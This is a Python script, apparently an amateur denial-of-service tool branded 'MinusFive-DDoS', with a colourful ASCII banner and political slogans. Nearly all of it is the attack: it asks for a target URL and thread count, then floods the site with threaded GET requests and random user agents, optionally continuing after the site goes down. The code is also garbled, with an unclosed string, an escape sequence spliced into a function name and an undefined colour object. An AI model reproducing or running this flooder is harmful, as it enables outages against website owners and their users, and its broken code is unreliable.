#!usr/bin/python
import os
import socket
from colorama import init
from colorama import Style
import requests
import random
import threading

class bcolors:
    T = '\033[95m'
    W = '\033[94m'
    E = '\033[96m'
    E = '\033[92m'
    N = '\033[93m'
    L = '\033[91m'
    I = '\033[0m'
    O = '\033[1m'
    M = '\033[4m'

os.system("Clear")
print(" ")                                              
print("\033[95m                                         \033[0m")
print("\033[95m                    @      @             \033[0m")
print("\033[95m                    @      @             \033[0m")
print("\033[95m     @      @  @  @ @ @    @  @ @        \033[0m")
print("\033[94m     @  @   @  @    ©      @ @   @       \033[0m")
print("\033[94m     ©  ©   ©  ©    ©   ©  ©     @       \033[0m")
print("\033[94m       ©  ©    ©     © ©   ©     ©       \033[0m")
print("\033[96m                                                              \033[0m")
print("\033[96m       @ @ @ @  @     @     @        @ @ @     @              \033[0m")
print("\033[96m      @         @     @    @ @           @    @ @             \033[0m")
print("\033[96m      @  @ @ @  @ @ @ @   @   @          @   @   @            \033[0m")
print("\033[93m      ©      ©  ©     ©  © @ @ ©   ©     ©  © © © ©           \033[0m")
print("\033[93m       © © © ©  ©     © ©       ©   © © ©  ©       ©          \033[0m")
print("\033[93m                                                              \033[0m")
print("\033[93m||==================================== by: ZhanAhmad ======|| \033[0m")
print("\033[91m||   S N I P E R   E L I T E   W I T   P A L E S T I N A   || \033[0m")
print("\033[91m||                                                         || \033[0m")
print("\033[91m||   B I R U H  B I D A M  N A F D I K A  Y A  A Q S H A   || \033[0m")
print("\033[93m||======= B A S E =========================================== \033[0m")
print("\033[4m________________________________________________________________\033[0m

text_url = input("\033[92m>>MinusFive-DDoS >>> | Website URL (http://website.com): \033[0m")
url = str(text_url)
text_threads = input("\033[1m>>MinusFive-DDoS >>> | Threads: \033[0m")
threads = int(text_threads)
text_timeout = in\033[4mput("$MinusFive-DDoS >>> | Timeout: \033[0m")
timeout = int(text_timeout)
text_keepattack = input(
    "$MinusFive-DDoS >>> | Keep Attack ?(Keep sending requestes even if the site is down | Default: False): ")
keepAttack = str(text_keepattack)
print(Fore.GREEN + "$MinusFive-DDoS >>> | Attack has been started for: " + url)

downMsgSent = False


def Attack():


 try:
    userAgent = getRandomUserAgent()
    headers = {'user-agent': userAgent}
    x = requests.get(url, headers=headers, timeout=timeout)
    if(x.status_code == 200):
        if(keepAttack == True or keepAttack == "True" or keepAttack == "true" or keepAttack == "yes" or keepAttack == "on" or keepAttack == "enable" or keepAttack == "y"):
            Attack()
 except:
        if(keepAttack == True or keepAttack == "True" or keepAttack == "true" or keepAttack == "yes" or keepAttack == "on" or keepAttack == "enable" or keepAttack == "y"):
            Attack()
            


def getRandomUserAgent():

    useragents = open('useragents.txt').read().splitlines()
    useragent = random.choice(useragents)
    return useragent


totalThr = []
for i in range(threads):
    thr = threading.Thread(target=Attack)
    thr.start()
    totalThr.append(thr)



for cThr in totalThr:
    cThr.join()
